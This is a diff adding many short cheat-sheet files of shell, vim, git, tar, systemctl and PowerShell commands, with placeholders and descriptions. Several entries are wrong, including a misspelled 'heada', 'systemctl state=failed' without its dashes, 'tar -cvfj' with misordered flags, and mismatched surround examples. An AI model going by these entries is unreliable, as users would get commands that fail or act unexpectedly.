+$(tput setaf 6)
+
+# Ansi tput method for Foreground Light Cyan
+
+$(tput setaf 14)
+
+# Ansi tput method for Foreground White
+
+$(tput setaf 7)
+
+# Ansi tput method for Foreground Light White
+
+$(tput setaf 15)
+
+
+# Ansi tput method for Background Black
+
+$(tput setab 0)
+
+# Ansi tput method for Background Light Black
+
+$(tput setab 8)
+
+# Ansi tput method for Background Red
+
+$(tput setab 1)
+
+# Ansi tput method for Background Light Red
+
+$(tput setab 9)
+
+# Ansi tput method for Background Light Green
+
+$(tput setab 2)
+
+# Ansi tput method for Background Light Green
+
+$(tput setab 10)
+
+# Ansi tput method for Background Yellow
+
+$(tput setab 3)
+
+# Ansi tput method for Background Light Yellow
+
+$(tput setab 11)
+
+# Ansi tput method for Background Blue
+
+$(tput setab 4)
+
+# Ansi tput method for Background Light Blue
+
+$(tput setab 12)
+
+# Ansi tput method for Background Magenta
+
+$(tput setab 5)
+
+# Ansi tput method for Background Light Magenta
+
+$(tput setab 13)
+
+# Ansi tput method for Background Cyan
+
+$(tput setab 6)
+
+# Ansi tput method for Background Light Cyan
+
+$(tput setab 14)
+
+# Ansi tput method for Background White
+
+$(tput setab 7)
+
+# Ansi tput method for Background Light White
+
+$(tput setab 15)
+
+# Set variable to the value of a unicode character
+
+circle_red_large=$'\U2B55'
+
+
+==> shell__vi-mode.cheat <==
+% shell, console, cli, vi mode, movements, cursor, text
+
+# Enable vi mode in Bash shell
+
+add the following to ~/.inputrc "set editing-mode vi"
+
+# Move to the start of the command line text
+
+^ OR I
+
+# Move to the end of the command line text
+
+$
+
+# Move one word forwards in the command line text
+
+w
+
+# Move one word segment backwards in the command line text
+
+b  (this takes 4 steps to move from the last 'e' to the first '-' in the following example " --backwards-move ")
+
+# Move one word boundary backwards in the command line text
+
+B  (this takes 1 step to move from the last 'e' to the first '-' in the following example " --backwards-move ")
+
+# Move to the end of the next word segment in the command line text
+
+e  (this takes 4 steps to move from the first '-' to the last 'e' in the following example " --forward-move ")
+
+# Move to the end of the next word boundary in the command line text
+
+E  (this takes 1 step to move from the first '-' to the last 'e' in the following example " --forward-move ")
+
+# Delete all text beginning at, and after the cursor 
+
+D
+
+# Undo the last change made to the command line text 
+
+u
+
+
+
+==> shm.txt <==
+
+==> ssh_1.cheat <==
+% ssh
+
+# 生成SSH秘钥对
+ssh-keygen -t rsa -C "<email>"
+
+==> ssh.cheat <==
+% ssh
+
+# login to a server and forward to ssh key (dangerous but usefull for bastion hosts)
+ssh -A <user>@<server>
+
+# login to a server with a key
+ssh -i <sshkey> <user>@<server>
+
+# login to a server with a port
+ssh -p <port> <user>@<server>
+
+# login to a server with a key and port
+ssh -i <sshkey> -p <port> <user>@<server>
+
+$ user : echo -e "$(whoami)\nroot"
+$ sshkey : find ~/.ssh | grep -v known_hosts | grep -v config
+$ server : cat /etc/hosts | cut -f2 -d' '
+==> text.cheat <==
+% text, encode, hex, base64
+
+# 16进制字符串转base64
+echo "<hex>" | xxd -r -p | base64
+
+==> utils__awk.cheat <==
+% awk
+
+# To sum integers from a file or stdin, one integer per line:
+printf '1\n2\n3\n' | awk '{ sum += $1} END {print sum}'
+
+# To use a specific character as separator to sum integers from a file or stdin:
+printf '1:2:3' | awk -F ":" '{print $1+$2+$3}'
+
+# To print a multiplication table:
+seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")}'
+
+# To specify an output separator character:
+printf '1 2 3' | awk 'BEGIN {OFS=":"}; {print $1,$2,$3}'
+
+# To execute commands only on rows that satisfy a certain condtion
+printf "george jetson\nolive oyl\nbeetle bailey" | awk '$2=="bailey"{print $0}'
+
+# To execute commands only on matching rows using regex
+printf "george jetson\nolive oyl\nbeetle bailey" | awk '/ley$/{print $0}'
+
+==> utils__disk.cheat <==
+% blkid, disk
+
+# Show available hard disk devices
+blkid
+
+# Available hard using a filter with the major device ID (comma separated list of numbers)
+lsblk --nodeps --noheadings --include <ids> --output NAME
+
+% lshw, disk
+
+# Show hard disk specifications and details
+lshw -class disk
+
+% hdparm, disk
+
+# Show information about SATA hard disks (using hdparm)
+hdparm -I /dev/<device>
+
+% nvme, disk
+
+# Show information about NVMe devices (using nvme)
+nvme list /dev/<device>
+==> utils__du.cheat <==
+% du, disk
+
+# Find the biggest directories on disk 
+du --all --human-readable --one-file-system <directory> | sort --human-numeric-sort --reverse | heada
+
+# Find when the last modification happened in a directory 
+du -sh --time <directory>
+==> utils__find.cheat <==
+% find
+
+# Find directories in location <dir>
+find <dir> -maxdepth 1 -type d
+
+# Find directories in location <dir> ignoring hidden directories
+find <directory> -maxdepth 1 -type d -not -path '*/.*' -not -path '.'
+
+# Prints all files that are descendants of your directory, skipping hidden files and directories
+find <directory> -not -path '*/.*'  -not -path '.'
+
+# Find files with some text in its name, but skip hidden files and directories
+find <directory> -not -path '*/.*' -type f -name '*<search text>*'
+
+# Find files with setuid (SUID)
+find <directory> -perm -4000
+
+# Find files with setuid (SUID)
+find <directory> -perm /u=s
+
+# Find files with setgid (SGID)
+find <directory> -perm -2000
+
+# Find files with setgid (SGID)
+find <directory> -perm /g=s
+
+# Searching for a directory with a specific name
+find <directory> -type d -name <name>
+
+# Find all empty directories under <directory>.
+find <directory>  -type d -empty
+
+# Find all the files owned by a specific user
+find <directory> -user <username>
+
+# Find all files owned by group
+find <directory> -group <group>
+
+# Find files smaller than x megabytes
+find <directory> -size -<x>M
+
+# Find files bigger than x megabytes
+find <directory> -size +<x>M
+
+# Find recently changed files - x minutes ago
+find <directory> -type f -mmin -<x>
+
+# Find files changed x weeks or later
+find <directory> -type f -mtime +<x>w
+
+# Looking for files that are changed after a specific date (yyyy-mm-dd)
+find <directory> -type f -newermt <date>
+
+# To find files modified in a specific date range (yyyy-mm-dd)
+find <directory> -type f -newermt <from> ! -newermt <to>
+
+# To find files accessed in a specific date range (yyyy-mm-dd)
+find <directory> -type f -newerat <from> ! -newerat <to>
+
+# Specify the depth to search
+find <directory> -maxdepth <depth> -print
+
+# Change all files that have file permissions of ^permissions_old' to more a sane value of ^permissions_new:
+find <directory> -type f -perm <permissions_old> -print -exec chmod <permissions_new> {} \;
+
+# Change all directories that have file permissions of ^permissions_old' to more a sane value of ^permissions_new:
+find <directory> -type d -perm <permissions_old> -print -exec chmod <permissions_new> {} \;
+
+# Find all writable files
+find <directory> -perm /222
+
+# Find writable files by others
+find <directory> -perm /002
+
+# Find writable files by others
+find <directory> -perm /g=w,o=w
+
+# Find symbolic links
+find <directory> -type l -xtype d
+
+==> utils__grep.cheat <==
+% grep
+
+# search a regular expression in a file
+grep <regex> <filename>
+
+# search a line which will start from only A-Z, a-z & 0-9 (Alphanumeric Characters).
+grep "^[[:alnum:]]"  <filename>
+
+# search line which will start from only [A-Z & a-z] i.e. Alpha Characters.
+grep "^[[:alpha:]]" <filename>
+
+# search line which will start from [Tab & Space] i.e. Blank Characters.
+grep "^[[:blank:]]" <filename>
+
+# search line which will start from digit [0-9] i.e. Digit Characters.
+grep "^[[:digit:]]" <filename>
+
+# search line which will start from lower letters i.e [a-z] (Lower Letters).
+grep "^[[:lower:]]" <filename>
+
+# search line which will start from [! " # $ % & ‘ ( ) * + , – . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~. ] i.e. Punctuation Characters.
+grep "^[[:punct:]]" <filename>
+
+# search a line which will start from Alphanumeric & Punctuation Characters called as Graphical Characters.
+grep "^[[:graph:]]" tecmint.tx
+
+search a line which will start from Alphanumeric, Punctuation and space characters.
+grep "^[[:print:]]" <filename>
+
+# search a line which will start from [tab, newline, vertical tab, form feed, carriage return, and space] i.e. Space Characters.
+grep "^[[:space:]]" <filename>
+
+# search a line which will start from [A-Z] i.e Upper-case Letters.
+grep "^[[:upper:]]" <filename>
+
+# searches a line which will start from [0-9, A-F and a-f] i.e Hexadecimal Digits.
+grep "^[[:xdigit:]]" <filename>
+
+# Search a string in Gzipped Files
+zgrep -i <text> <filename>
+
+==> utils__head.cheat <==
+% head
+
+# To show the first 10 lines of <file>:
+head <file>
+
+# To show the first <number> lines of <file>:
+head -n <number> <file>
+
+# To show the first <number> bytes of <file>:
+head -c <number> <file>
+
+==> utils__ip.cheat <==
+% ip, network
+$ type: echo -e "vlan\nbridge"
+
+# Show ARP cache
+ip neighbour
+
+# Delete an ARP entry
+ip neigh del <ip> dev <device> 
+
+# Show assigned IP address of the system.
+ip address
+
+# Show assigned IP address of the system.
+ip address dev <device>
+
+# Limit the output by specifying its type, such as a bridge or VLAN.
+ip address show type <type>
+
+# List Multicast IP addresses
+ip maddr
+
+# Show network routing information
+ip route
+
+# Test routing for a specific IP address
+ip route get <ip>
+
+# Define a default route on the ens18 interface.
+ip route add default via <ip> dev <device>
+
+# Delete a route for the defined network
+ip route delete <gatewaypip> via <ip>
+==> utils__loginctl.cheat <==
+% loginctl, linux
+
+# Get session type
+loginctl show-session $(awk '/tty/ {print $1}' <(loginctl)) -p Type | awk -F= '{print $2}'
+==> utils__lsof.cheat <==
+% lsof
+
+# identify the used file size (in blocks) as per https://access.redhat.com/solutions/2316
+lsof -Fn -Fs |grep -B1 -i deleted | grep ^s  | cut -c 2- | awk '{s+=$1} END {print s}'
+
+# obtain a list of deleted files which are still held open by applications
+lsof | egrep "deleted|COMMAND"
+
+# force the system to de-allocate the space consumed by an in-use file by forcing the system to truncate the file via the proc file system. 
+echo > /proc/<pid>/fd/<fd_number>
+
+# Open files in a specific directory
+lsof +D <directory>
+
+# What files are open to a specific mount point
+lsof +f -- <mountpoint>
+
+# Query all open files on NFS
+lsof -N
+
+# Open files by process id (PID)
+lsof -p <pid>
+
+# Open files by process name
+lsof -c <processname>
+
+# Open files by user
+lsof -u <username>
+
+# All open files except of user <username>
+lsof -u ^<username>
+
+# Uncover deletet files
+lsof +L1
+
+# Open network connections (related sockets) by specifing multiple ports (comman sparated)
+lsof -i :<ports>
+
+# Open network connections (related sockets) by specifing protocols
+lsof -i UDP -i TCP
+
+# Show listening TCP services, limit the output. To avoid any lookups (hostname or service name), add -n and -P.
+lsof -n -P -i TCP -sTCP:Listen
+
+# Open connections for a single IP address can be specified as well, optionally with a port.
+lsof -n -P -i @<ip:port>
+==> utils__scp.cheat <==
+% scp
+
+# Copy a file from local to a remote host
+scp <source_file_name> <username>@<host>:<folder>
+
+# Copy a file from remote to local host
+scp <username>@<host>:<file> <target_folder>
+
+# Copy a file from local to a remote host while compressing
+scp -Cpv <source_file_name> <username>@<host>:<folder>
+
+# Copy a file from remote to local host while compressing
+scp -Cpv <username>@<host>:<file> <target_folder>
+
+# Change SCP Cipher to encrypt files
+$ cipher = echo "3des"
+scp -c <cipher> <source_file_name> <username>@<host>:<folder>
+
+# Limiting bandwidth usage
+scp -l <kbps> <source_file_name> <username>@<host>:<folder>
+
+# Use a different port for scp
+scp -P <port> <source_file_name> <username>@<host>:<folder>
+
+# Copy files and directories recursively
+scp -r <source_folder> <username>@<host>:<folder>
+
+# Disable progress messages
+scp -q <source_file_name> <username>@<host>:<folder>
+==> utils__sed.cheat <==
+% sed 
+
+# Remove trailing whitespace from a file 
+sed -i 's/[[:space:]]*$//' <file>
+
+# Insert a line at the beginning of a file 
+sed -i '1i <text>' <file>
+==> utils__system.cheat <==
+% process, linux
+
+# See the cgroup of a process
+cat /proc/$(pidof -s <process name>)&/cgroup
+
+# See cgroup in ps output
+ps -e -o pid,cgroup:64,args
+
+# Show the systemd machine ID 
+hostnamectl
+
+# KVM mount 9p virtio
+mount -t 9p -o trans=virtio,version=9p2000.L <hostshare> <mount_dir>
+==> utils__systemctl.cheat <==
+% systemctl, systemd
+$time: echo -e "target"
+
+# Stop running service
+systemctl stop <service>
+
+# Start service
+systemctl start <service>
+
+# Restart running service
+systemctl restart <service>
+
+# Reload config files for service
+systemctl reload <service>
+
+# Reload changed unit files
+systemctl daemon-reload
+
+# Show status of service
+systemctl status <service>
+
+# Show failed services (or --failed)
+systemctl state=failed
+
+# See all enabled services with systemctl 
+systemctl list-unit-files --type=service --state=enabled
+
+# Resets unit(s) with failed state
+systemctl reset-failed
+
+# Enable service or unit and allow start on boot
+systemctl enable <service>
+
+# Disable service or unit, don’t start at boot
+systemctl disable
+
+# Fully disable a unit
+systemctl mask
+
+# Reactivate unit again after being masked
+systemctl unmask
+
+# Show unit file details
+systemctl cat <service>
+
+# Show properties
+systemctl show <service>
+
+# See memory usage of a service with systemctl
+systemctl show --property=MemoryCurrent <service> | awk -F= '{print $2}'
+
+# Create configuration as drop in unit (extension to primary config)
+systemctl edit <service>
+
+# Edit primary unit file for service
+systemctl edit --full <service>
+
+# See only running services instead all active units
+systemctl --type=service --state=running --legend=false
+
+# See all masked units - systemd uses the concept of masked units that prevents those units from being started
+systemctl list-unit-files --state=masked
+
+# See all active systemd units of one type 
+systemctl list-units --type=<type>
+==> utils__tar.cheat <==
+% tar
+
+# Create a tar file for a directory <directory> in current directory
+tar -cvf <archive_file>.tar <directory>
+
+# Create a tar.gz file for a directory <directory> in current directory
+$ ext: echo "tar.gz tgz"
+tar -cvzf <archive_file>.<ext> <directory>
+
+# Create a tar.bz2 file for a directory <directory> in current directory
+$ ext: echo "tar.bz2 tbz tb2"
+tar -cvfj <archive_file>.<ext> <directory>
+
+# Untar files in current directory
+tar -xvf <archive_file>
+
+# Untar files in specified directory
+tar -xvf <archive_file>.tar -C <target_dir>
+
+# List files in tar/tgz/tbz archive
+tar -tvf <archive_file>
+
+# Extract specific file from tar archive
+tar -xvf <archive_file>.tar <file_to_extract>
+
+# Extract specific file from tgz archive
+$ ext: echo "tar.gz tgz"
+tar -zxvf <archive_file>.<ext> <file_to_extract>
+
+# Extract specific file from tbz archive
+$ ext: echo "tar.bz2 tbz tb2"
+tar -jxvf <archive_file>.<ext> <file_to_extract>
+
+# Extract specific file from tar archive using wildcards
+tar -xvf <archive_file>.tar --wildcards '<wildcard_expression>'
+
+# Extract specific file from tgz archive using wildcards
+$ ext: echo "tar.gz tgz"
+tar -zxvf <archive_file>.<ext> --wildcards '<wildcard_expression>'
+
+# Extract specific file from tbz archive using wildcards
+$ ext: echo "tar.bz2 tbz tb2"
+tar -jxvf <archive_file>.<ext> --wildcards '<wildcard_expression>'
+
+# Add files or directory to tar archive
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar -rvf <archive_file>.tar <files_to_add>
+
+# Verify tar, tar.gz, and tar.bz2 archive file
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar tvfW <archive_file>.<ext>
+
+# Check tar file size
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar -czf <archive_file>.<ext> | wc -c
+
+# Remove file and directory from tar file
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar --delete -f <archive_file>.<ext> <files_to_exclude>
+==> utils__time.cheat <==
+% time
+
+# See the time synchronization details with timedatectl 
+timedatectl timesync-status
+==> utils__wc.cheat <==
+% wc
+
+# Count number of lines, number of words and number of bytes in a file
+wc <filename>
+
+# Count number of lines in a file
+wc -l <filename>
+
+# Count number of words in a file
+wc -w <filename>
+
+# Count number of characters in a file
+wc -m <filename>
+
+# Count number of bytes in a file
+wc -c <filename>
+
+# Display Length of Longest Line in File
+wc -L <filename>
+
+==> vim__easymotion.cheat <==
+% vim-easymotion, easymotion, plugins, neovim, vim, vi
+
+# Trigger word motion
+
+<leader><leader>w
+
+# Move cursor to one space before the specific letter
+
+<leader><leader>t<char>
+
+# Move cursor to one space after the specific letter (backwards)
+
+<leader><leader>T<char>
+
+# word motion and search for a specific letter
+
+<leader><leader>f<char>	uses the 'f' motion
+
+# word motion and search for a specific letter (backwards)
+
+<leader><leader>F<char>	uses the 'F' motion
+
+
+==> vim__folding.cheat <==
+% folding, code, text, vi, vim, neovim
+
+# Reduces fold level throughout the buffer
+
+zr 
+
+# Opens all folds
+
+zR 
+
+# Increases fold level throughout the buffer
+
+zm 
+
+# Fold everything all the way
+
+M 
+
+# Open the fold your cursor is on
+
+za 
+
+# Open the fold your cursor is on recursively
+
+zA 
+
+# Close the fold your cursor is on
+
+zc 
+
+# Close the fold your cursor is on recursively
+
+zC 
+
+
+
+==> vim__formatting.cheat <==
+% formatting, code, text, pretty, neovim, vim, vi
+
+# Format text object for outermost JSON object
+
+aj
+
+# Format text object for innermost JSON object
+
+ij
+
+# Format (pretty print) JSON under the cursor
+
+gqaj
+
+==> vim__markdown.cheat <==
+% markdown, navigation, text, neovim, vim, vi
+
+# Open linked file under cursor in vim 
+
+ge
+
+# Open linked url under cursor in browser
+
+gx
+
+# Goto current header
+
+c
+
+# Goto parent header
+
+u
+
+# Goto next header
+
+]]
+
+# Goto previous header
+
+[[
+
+# Goto next sibling header, if any
+
+][
+
+# Goto previous sibling header, if any
+
+[]
+
+==> vim__movements.cheat <==
+% movement, navigation, vi, vim, neovim
+
+# Move cursor forward to the end of the next word segment
+
+b OR <num>b  (Requires 5b to jump across the following " merry-go-round ")
+
+# Move cursor forward to the end of the next word boundary
+
+B OR <num>B  (Requires B (1 step) to jump across the following " merry-go-round ")
+
+# Move cursor to Nth occurrence of {char} 
+# Move cursor forward to the end of the next word segment
+
+e OR <num>e  (Requires 5e to jump across the following " merry-go-round ")
+
+# Move cursor forward to the end of the next word boundary
+
+E OR <num>E  (Requires E (1 step) to jump across the following " merry-go-round ")
+
+# Move cursor to Nth occurrence of {char} 
+
+f<char> OR <num>f<char>
+
+# Move cursor before Nth occurrence of {char} to the right
+
+t<char> OR <num>f<char>
+
+# Move cursor N paragraphs backward
+
+{ OR <num>{
+
+# Move cursor N Paragraphs forward
+
+} OR <num>}
+
+# Move cursor to column first column on the current line
+
+| OR ^
+
+# Move cursor to column Nth column on the current line
+
+<num>|
+
+==> vim__multi-cursor.cheat <==
+% multi-cursor, multi, cursors, neovim, vim, vi
+
+# Begin selection. repeat to add
+
+<ctrl>n
+
+# Create cursors
+
+<ctrl>Up OR <ctrl>Down
+
+# Jump to next/previous occurrence
+
+n OR N 
+
+# Select next/previous cursor
+
+[ OR ]
+
+# Skip and get next occurrence
+
+q
+
+# Remove current cursor
+
+Q
+
+# Switch to `extend` mode
+
+<tab>
+
+
+==> vim__navigation.cheat <==
+% page, navigation, vi, vim, neovim
+
+# Move cursor to the top of the page
+
+H
+
+# Move cursor to the middle of the page
+
+M
+
+# Move cursor to the bottom of the page
+
+L
+
+
+==> vim__nerd-commenter.cheat <==
+% nerd-commenter, comments, code, text, vi, vim, neovim
+
+# Toggle comment (modes: normal, visual) (preservim/nerdcommenter) 
+<leader>c<space>
+
+# Comment out the current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cc |NERDCommenterComment|
+
+# Same as cc but forces nesting. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cn |NERDCommenterNested|
+
+# Toggles the comment state of the selected line(s). If the topmost selected line is commented, all selected lines are unco# mmented and vice versa. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>c<space> |NERDCommenterToggle|
+
+# Comments the given lines using only one set of multipart delimiters. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cm |NERDCommenterMinimal|
+
+# Toggles the comment state of the selected line(s) individually. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>ci |NERDCommenterInvert|
+
+# Comments out the selected lines with a pretty block formatted layout. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cs |NERDCommenterSexy|
+
+# Same as cc except that the commented line(s) are yanked first. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cy |NERDCommenterYank|
+
+# Comments the current line from the cursor to the end of line. (modes: normal, visual) (preservim/nerdcommenter)
+<leader>c$ |NERDCommenterToEOL|
+
+# Adds comment delimiters to the end of line and goes into insert mode between them. (modes: normal, visual) (preservim/nerdcommenter)
+<leader>cA |NERDCommenterAppend|
+
+# Switches to the alternative set of delimiters (modes: normal, visual) (preservim/nerdcommenter)
+<leader>ca |NERDCommenterAltDelims|
+
+# or both sides (<lea# der>cb). (modes: normal, visual) (preservim/nerdcommenter)
+<leader>cl 
+
+# Comment out (and align left) the current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cl |NERDCommenterAlignLeft 
+
+# Comment out (and align left) the current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cb |NERDCommenterAlignBoth
+
+# Uncomment current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cu |NERDCommenterUncomment|
+
+
+==> vim__sorting.cheat <==
+% sorting, text, neovim, vim, vi
+
+# Sort lines beginning at cursor "go sort"
+
+gs
+
+# Sort "2" lines down "j" beginning at cursor "go sort"
+
+gs2j
+
+# Sort lines/text inside "i" parens "("
+
+gsi(
+
+# Sort lines inside "i" paragraph "p"
+
+gsip
+
+==> vim__splits.cheat <==
+
+# Open new horizontal split
+
+:sp <file>
+
+# Open new vertical split
+
+:vsp <file>
+
+# Move between open split buffers
+
+<ctrl>w [hjkl]
+
+# Resize current horizontal split
+
+:resize <num> OR :res <num>
+
+# Resize current horizontal split by a relative amount
+
+:res +<num> OR :res -<num> (num can be + or -)
+
+# Resize current vertical split
+
+:vertical resize <num> OR :vertical res <num>
+
+# Resize current vertical split by a relative amount
+
+:vertical res +<num> OR :vertical res -<num>
+
+# Resize current horizontal split by one line
+
+<ctrl>w + OR <ctrl>w -
+
+# Resize current horizontal split by <num> lines
+
+<ctrl>w <num> + OR <ctrl>w <num> -
+
+# Resize current vertical split by one line
+
+<ctrl>w > OR <ctrl>w <
+
+# Resize current vertical split by <num> lines
+
+<ctrl>w <num> > OR <ctrl>w <num> <
+
+# Resize all windows to equal dimensions
+
+<ctrl>w =
+
+# Resize a window to maximum height
+
+<ctrl>w _
+
+# Resize a window to maximum width
+
+<ctrl>w |
+
+
+==> vim__surround.cheat <==
+% vim-surround, surround, wrap, text, neovim, vim, vi
+
+# Surround text under cursor with double-quote
+
+ysiw<char>	example -> ysiw" -> "example"
+
+# Surround text under cursor with single-quote
+
+ysiw<char>	example -> ysiw' -> 'example' 
+
+# Surround text under cursor with html/xml brackets
+
+ysiw<p>	example -> <p>example</q>
+
+# Surround text under cursor with other text
+ysiw*	example -> *example*
+
+# Change surrounding delimiters
+
+cs<char><char> 'example' cs'" -> "example"
+
+# Delete surrounding delimiters
+
+ds<char>	"example" -> ds" -> example
+
+# Surround text under cursor with () [] or {} without space or padding
+
+ysiw(	example -> (example)
+
+# Surround text under cursor with () [] or {} with space or padding
+
+ysiw)	example -> ( example )
+
+# Change surrounding () [] or {} to include space
+
+cs)(	(example) -> ( example )
+
+# Change surrounding () [] or {} to include space and change delimiter
+
+cs]{	[example] -> { example }
+
+# Surround the entire current line under cursor with parens () without space or padding
+
+yssb OR yss)	example line -> (example line)
+
+# Surround the entire current line under cursor with parens () with space or padding
+
+yss<space>b OR yss(	example line -> (example line)
+
+# Surround the entire current line under cursor with curly braces {} without space or padding
+
+yssB OR yss}	example line -> (example line)
+
+# Surround the entire current line under cursor with curly braces {} with space or padding
+
+yss<space>B OR yss{	example line -> { example line }
+
+
+==> vim__tabs.cheat <==
+% tabs, workspace, buffers, window, neovim, vim, vi
+
+# Open file in a new tab
+
+:tabnew <file>
+
+# Go to the next tab
+
+:tabn OR :tabnext
+
+# Go to the previous tab
+
+:tabp OR :tabprevious
+
+# Close all other tabs
+
+:tabo OR :tabonly
+
+
+==> vim__visual-mode.cheat <==
+% visual, visual-mode, neovim, vim, vi
+
+# surround visual selection with []
+
+v$jS]
+
+# Select from cursor up to end of current paragraph 
+
+v}
+
+# Select from cursor up to end of current paragraph 
+
+v)
+
+# Select from cursor back to start of previous paragraph 
+
+v{
+
+# Select from cursor back to start of current paragraph 
+
+v(
+
+# Select current line | select current to N lines
+
+V*
+
+# Select text inside parens ()
+
+vib or vi)
+
+# Delete text inside parens ()
+
+dib or di)
+
+# Change text inside parens ()
+
+cib or ci)
+
+# Extend highlighted area with a () block
+
+ab
+
+# Extend highlighted area with a paragraph
+
+ap
+
+# Extend highlighted area with a sentence
+
+as
+
+# Extend highlighted area with a tag block
+
+at
+
+# Extend highlighted area with 'a word'
+
+aw
+
+# Format the highlighted lines
+
+gq
+
+# Extend highlighted area with inner () block
+
+ib
+
+# Extend highlighted area with inner paragraph
+
+ip
+
+# Extend highlighted area with inner sentence
+
+is
+
+# Extend highlighted area with inner tag block
+
+it
+
+# Extend highlighted area with 'inner word'
+
+iw
+
+# Select a <> block
+
+a<
+
+# Select a single-quoted string
+
+a'
+
+# Select a double-quoted string
+
+a"
+
+==> windows__windows.cheat <==
+% windows, powershell
+
+# to list all the features available with a given string
+Get-WindowsFeature | Where-Object Name -like '*<search_string>*' | Select-Object 
+
+# remove feature from windows
+Remove-WindowsFeature <feature_name>
+
+% proxy
+@ windows, powershell
+
+# Use a proxy that isn't already configured in Internet Options
+[net.webrequest]::defaultwebproxy = new-object net.webproxy "http://proxy.example.org:8080"
+
+# Use the Windows credentials of the logged-in user to authenticate with your proxy
+[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials
+
+# Use other credentials (replace 'username' and 'password')
+[net.webrequest]::defaultwebproxy.credentials = new-object net.networkcredential 'username', 'password'
+
+==> zip.cheat <==
+%zip, file
+
+# 将文件压缩成几个小文件
+zip - <input_zip> | split -b 500k -a 3 - <output_zip>
+==> awk.cheat <==
+% awk, text
+
+# 文件按列过滤打印
+cat <input_text> | awk '{print $1,$2,$3}'
+
+# 文件按列去重
+cat <input_text> | uniq
+
+# 文件搜索列
+cat <input_text> | awk '{if ($2=="<search_text>") {print $1,$2,$3} }' 
+
+# 文件去重后输出重复行数
+cat <input_text> | uniq | wc -l
+
+==> cheats__process.cheat <==
+% htop, process
+
+# show process with current users
+htop -u <user>
+ps -u <user> ux
+
+# kill process
+kill <pid>
+
+$ user: echo "$USER"
+$ pid: ps -u $USER --no-headers ux | awk '{print $2}'
+
+==> cheats__slurm.cheat <==
+% slurm
+
+# view job queue for specific user
+squeue -u <user>
+squeue -u <user> -o "%.10i %.9P %.8j %.2t %.10M %.6D %Z"
+squeue -u <user> -o "%.10i %.9P %.8j %.2t %.10M %.6D %Z" | sed -e "s#$SCRATCH#\$SCRATCH#g"
+
+# cancel job
+scancel <job_id>
+# cancel all jobs
+squeue -u <user> -h | awk '{print $1}' | xargs scancel
+
+# get job info
+scontrol show jobid -d <job_id>
+# get very detailed job info
+scontrol show jobid -dd <job_id>
+
+# watch job info
+watch -n <watch_sec> "squeue -u <user>"
+watch -n <watch_sec> "echo \"Total (`squeue -u <user> | wc -l`) jobs\"; echo ''; squeue -u <user>"
+
+$ user: echo "$USER"
+$ job_id: squeue -u $USER -o %i -h
+$ watch_sec: echo "5"
+
+==> cheats__tarball.cheat <==
+% tar
+
+# create a `.tar.gz` file excluding `*/tmp`
+tar --exclude="*/tmp" -cvf <archive_fname>.tar.gz <fnames>
+
+$ fnames: echo "`ls | xargs`"; ls -t
+$ archive_fname: basename $(pwd); ls -t
+
+# extract tarball to a folder with same basename
+tar -xvf <tarball> --one-top-level
+
+$ tarball: ls | grep 'gz$'
+
+==> chrt.cheat <==
+% linux, scheduler
+
+# Show the assigned policy and priority for process ID 1234
+
+chrt --pid <pid>
+
+# Runs a command with a fairly low priority as a batch task (SCHED_BATCH)
+
+chrt --batch <priority> <command>
+
+# Assign SCHED_OTHER policy with priority 0 for process ID 1234
+
+chrt --other --pid <priority> <pid>
+==> code__git.cheat <==
+% git
+
+# Set global git user name
+git config --global user.name <name>
+
+# Set global git user email
+git config --global user.email <email>
+
+# Initializes a git repository
+git init
+
+# Clone a git repository
+git clone -b <branch_name> <repository> <clone_directory>
+
+# Shallow clone with depth 1 with all branches and submodules
+git clone --depth=1 --no-single-branch --recurse-submodules <repository> <clone_directory>
+
+# Rebase upstream master into local/origin master (use if people don't clone your repository)
+git fetch <remote_name>
+git checkout master
+git rebase <remote_name>/master
+git fetch --unshallow origin
+git push -f origin master
+
+# Merge upstream master into local/origin master (use if people clone your repository)
+git fetch <remote_name>
+git checkout master
+git merge <remote_name>/master
+git fetch --unshallow origin
+git push -f origin master
+
+# View all available remote for a git repository
+git remote --verbose
+
+# Adds a remote for a git repository
+git remote add <remote_name> <remote_url>
+
+# Renames a remote for a git repository
+git remote rename <old_remote_name> <new_remote_name>
+
+# Remove a remote for a git repository
+git remote remove <remote_name>
+
+# Checkout to branch
+git checkout <branch>
+
+# Displays the current status of a git repository
+git status
+
+# Displays unstaged changes for file
+cd <toplevel_directory>; \
+    git diff <unstaged_files>
+
+# Stage single or multiple files
+cd <toplevel_directory>; \
+    git add <changed_files>;
+
+# Stage all files in project
+git add -A
+
+# Create commit for staged files
+git commit -m "<commit_description>"
+
+# Create backdated commit for staged files
+git commit --date="<number_of_days_ago> days ago" -m "<commit_description>"
+
+# Pushes committed changes to remote repository
+git push -u <remote_name> <branch_name>
+
+# Pushes changes to a remote repository overwriting another branch
+git push <remote_name> <branch>:<branch_to_overwrite>
+
+# Overwrites remote branch with local branch changes
+git push <remote_name> <branch_name> -f
+
+# Pulls changes to a remote repo to the local repo
+git pull --ff-only
+
+# Merges changes on one branch into current branch
+git merge <branch_name>
+
+# Abort the current conflict resolution process, and try to reconstruct the pre-merge state.
+git merge --abort
+
+# Displays log of commits for a repo
+git log
+
+# Displays formatted log of commits for a repo
+git log --all --decorate --oneline --graph
+
+# Clear everything
+git clean -dxf
+
+# Sign all commits in a branch based on master
+git rebase master -S -f
+
+# See all open pull requests of a user on Github
+navi fn url::open 'https://github.com/pulls?&q=author:<user>+is:open+is:pr'
+
+# Checkout a branch from a fork
